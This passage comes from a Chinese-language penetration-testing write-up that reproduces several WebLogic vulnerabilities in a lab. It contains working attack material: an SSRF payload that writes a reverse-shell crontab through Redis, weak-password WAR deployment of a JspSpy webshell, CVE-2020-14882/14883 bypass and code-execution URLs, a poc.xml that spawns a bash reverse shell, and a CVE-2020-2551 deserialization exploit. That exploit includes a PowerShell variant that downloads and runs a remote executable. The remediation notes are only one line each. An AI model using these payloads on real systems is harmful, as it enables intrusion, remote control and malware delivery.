operator=http://172.20.0.2:6379/test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.0.104%2F12345%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa
```

![image-20210814210942824](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-95fb910178f0da7dba34ea65b84fa7ff17a44c38.png)

![image-20210814211117689](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-944faada5b760fdcb9226fda06894033584a0ace.png)

反弹shell成功。

##### 安全防护

升级高版本。

#### 8.Weblogic弱口令&amp;&amp;后台getshell

##### 漏洞简介

由于管理员的安全意识不强，或者配置时存在疏忽，会导致后台存在弱口令或者默认的用户名/口令。

#### 影响版本

全版本

#### 漏洞复现

通过弱口令登录管理台后，点击部署-&gt;安装

![image-20210814212040819](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-489ec3ef344a5e64bc1cdf55bf3e998a9a3e63b6.png)

![image-20210814212434754](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-6faed4a99783e57fcfc61cd59e4e17c24f80a719.png)

![image-20210814212521338](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-878abfd3a4dbfda6482ae1702a424c69b0697fbe.png)

这里war包成功上传

![image-20210814212645817](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-dedeaf0c50938c5b881cb5fa0ed6eded67dde156.png)

将其作为应用程序安装

![image-20210814212917962](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-41d954c334dfa932d3b66440806d78d8a7bf7be7.png)

点击完成。

![image-20210814213012827](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-cb31b63a29da5a5cb7cc048e69023f895e82694e.png)

可以看见部署成功，访问url

```php
http://192.168.0.105:7001/zcc/JspSpy.jsp
```

输入密码，即可成功拿到webshell

![image-20210814214304327](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-32e8d88028b7bb0a08fcbe637959a84d9ce36407.png)

#### 安全防护

避免出现弱口令

#### 9.Weblogic Console HTTP协议远程代码执行漏洞(CVE-2020-14882/CVE-2020-14883)

##### 漏洞简介

未经身份验证的远程攻击者可能通过构造特殊的 HTTP GET请求，利用该漏洞在受影响的 WebLogic Server 上执行任意代码。它们均存在于WebLogic的Console控制台组件中。此组件为WebLogic全版本默认自带组件，且该漏洞通过HTTP协议进行利用。将CVE-2020-14882和CVE-2020-14883进行组合利用后，远程且未经授权的攻击者可以直接在服务端执行任意代码，获取系统权限。

##### 影响版本

```php
10.3.6.0
12.1.3.0
12.2.1.3
12.2.1.4
14.1.1.0
```

##### 漏洞复现

CVE-2020-14883: 权限绕过漏洞的poc：

```php
http://192.168.0.105:7001/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&_pageLabel=AppDeploymentsControlPage&handle=com.bea.console.handles.JMXHandle%28%22com.bea%3AName%3Dbase_domain%2CType%3DDomain%22%29
```

访问该url之后，进入如下页面，可以看见成功进入管理台：

![image-20210814220636352](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-fabbbbe502dd7f85fba7f0fe9c0f6149b2daef3a.png)

CVE-2020-14882: 代码执行漏洞的poc：

```php
http://192.168.0.106:7001/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&_pageLabel=HomePage1&handle=com.tangosol.coherence.
mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27touch /tmp/zcc123%27);%22);
```

这里复现用的vulhub靶场

![image-20210814222333621](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-3930d07370a22fab8cea925fde9bd1a5aa0a2944.png)

访问报404，不要慌，此时去容器中看会发现文件已成功写入；

![image-20210814221311713](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-8d1728a795c64348379b48b285aa43031b6b5a11.png)

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-6e82ea2fd4ed93c59ec27954aa6ed24c05a5eafa.png)

这里执行反弹shell的xml文件poc.xml：

```php
## poc.xml
<beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
  <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
    <constructor-arg>
      <list>
        <value>/bin/bash</value>
        <value>-c</value>
        <value><![CDATA[bash -i >& /dev/tcp/192.168.0.104/6669 0>&1]]></value>
      </list>
    </constructor-arg>
  </bean>
</beans>
```

把poc.xml放在打开http服务的kali机子上(ip:192.168.0.108)：

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-6e7bec09d807fe9e492ecd492a9549aa508a2d00.png)

在监听机子上开启监听：

![image-20210814223442393](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-f4c88e9fc28f6999b6805cf5942f886ab763ae20.png)

然后访问该url：

```php
http://192.168.0.106:7001/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&_pageLabel=HomePage1&handle=com.bea.core.repackaged
.springframework.context.support.ClassPathXmlApplicationContext("http://192.168.0.108/poc.xml")
```

![image-20210814224224450](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-8d8db1eea274d4dacc1425da3d7e2aadf12e7f02.png)

同理，上线cs的话把反弹的命令改了即可。

##### 安全防护

升级官方补丁：<https://www.oracle.com/security-alerts/cpuoct2020.html>

#### 10.IIOP反序列化漏洞（CVE-2020-2551）

##### 漏洞简介

2020年1月15日，Oracle官方发布2020年1月关键补丁更新公告CPU（CriticalPatch Update），其中CVE-2020-2551的漏洞，漏洞等级为高危，CVVS评分为9.8分，漏洞利用难度低。IIOP反序列化漏洞影响的协议为IIOP协议，该漏洞是由于调用远程对象的实现存在缺陷，导致序列化对象可以任意构造，在使用之前未经安全检查，攻击者可以通过 IIOP 协议远程访问 Weblogic Server 服务器上的远程接口，传入恶意数据，从而获取服务器权限并在未授权情况下远程执行任意代码.

##### 影响版本

```php
10.3.6.0
12.1.3.0
12.2.1.3
12.2.1.4
```

##### 漏洞复现

需要安装java8环境

```php
cd /opt
curl http://www.joaomatosf.com/rnp/java_files/jdk-8u20-linux-x64.tar.gz -o jdk-8u20-linux-x64.tar.gz
tar zxvf jdk-8u20-linux-x64.tar.gz
rm -rf /usr/bin/java*
ln -s /opt/jdk1.8.0_20/bin/j* /usr/bin
javac -version
java -version
```

这里我已经安装好

![image-20210814225849356](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-169b6b206640ac111f5801972be9d8bb0e15e40f.png)

exp.java代码

```php
import java.io.IOException;
public class exp {
    static{
        try {
            java.lang.Runtime.getRuntime().exec(new String[]{"cmd","/c","calc"});
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    public static void main(String[] args) {

    }
}
```

java编译exp.java

```php
javac exp.java -source 1.6 -target 1.6
```

![image-20210814230430269](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-8e8b2d3c2c025b60378d949a865d50522cd932c4.png)

接着python开启http服务,与exp.class在同一文件夹即可

![image-20210814230710705](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-6116d9efeee277003d80f99e59895bf38d9a896e.png)

使用marshalsec启动一个rmi服务

```php
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://192.168.0.108/#exp" 12345
```

![image-20210814230935474](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-8212cda0a506ed4bcbc65e407612a431eac438ac.png)

使用工具weblogic\_CVE\_2020\_2551.jar，执行exp

```php
java -jar weblogic_CVE_2020_2551.jar 192.168.0.105 7001 rmi://192.168.0.108:12345/exp
```

![image-20210814231847184](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-9820a62402af8ab4b797620d26558597d3457cc5.png)

可以看见成功弹出

![image-20210814231822800](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-d20f40356f11db9a7f606291ecebdc7add1348e2.png)

同理，上线cs的话，只需改exp.java代码即可，后续步骤一样

```php
import java.io.IOException;
public class exp {
    static{
        try {
            java.lang.Runtime.getRuntime().exec(new String[]{"powershell","/c"," (new-object System.Net.WebClient).DownloadFile('http://x.x.x.x/zcc.exe','zcc.exe');start-process zcc.exe"});
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    public static void main(String[] args) {

    }
}
```

##### 安全防护

使用官方补丁进行修复：<https://www.oracle.com/security-alerts/cpujan2020.html>